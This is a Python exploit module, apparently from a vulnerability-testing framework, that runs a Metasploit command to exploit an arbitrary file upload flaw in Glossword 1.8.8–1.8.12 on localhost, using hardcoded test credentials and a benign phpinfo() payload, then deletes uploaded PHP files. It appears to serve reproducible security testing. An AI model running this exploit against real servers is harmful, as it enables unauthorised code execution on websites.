import sys
import os
import time

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):
    # Note exploit fails in glossword_upload_exec.rb if res.code is checked ~ Line150
    # Had to change check to 200 instead of 301

    attributes = {'Name' :        "OSVDB_89960",
                  'Description' : "Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability"
                                  "This application has an upload feature that allows an authenticated user"
		  		  "with administrator roles to upload arbitrary files to /gw_temp/a/ .",
                  'References' :  [['OSVDB', '89960']],
                  'Target' :      "Glossword 1.8.12",
                  'TargetLicense' : '',
                  'VulWikiPage' : "",
                  'Type' : 'EXEC'
                  }

    def __init__(self):
        framework.Exploit.__init__(self)
        return
            
    def exploit(self):
        driver = self.create_selenium_driver()

        metasploit_cmd = "framework/Exploits/metasploit-framework/msfcli multi/http/glossword_upload_exec " \
                         "RHOST=127.0.0.1 TARGETURI=/glossword/1.8/ USERNAME=dict-contrib PASSWORD=contribpw21 " \
                         "PAYLOAD=generic/custom PAYLOADSTR=\'phpinfo();\' E"
        self.logger.info("Running Metasploit")
        os.system(metasploit_cmd)

        self.logger.info("Done! Browse to the payload at http://127.0.0.1/glossword/1.8/[tmpdir] where [tmpdir] is the url shown by Metasploit")
        driver.cleanup()
        return

    def cleanup(self, system_dir):
        self.logger.info("removing php files in gw_temp")
        os.system("rm -f " + system_dir + "/var/www/glossword/1.8/gw_temp/*.php")
        return
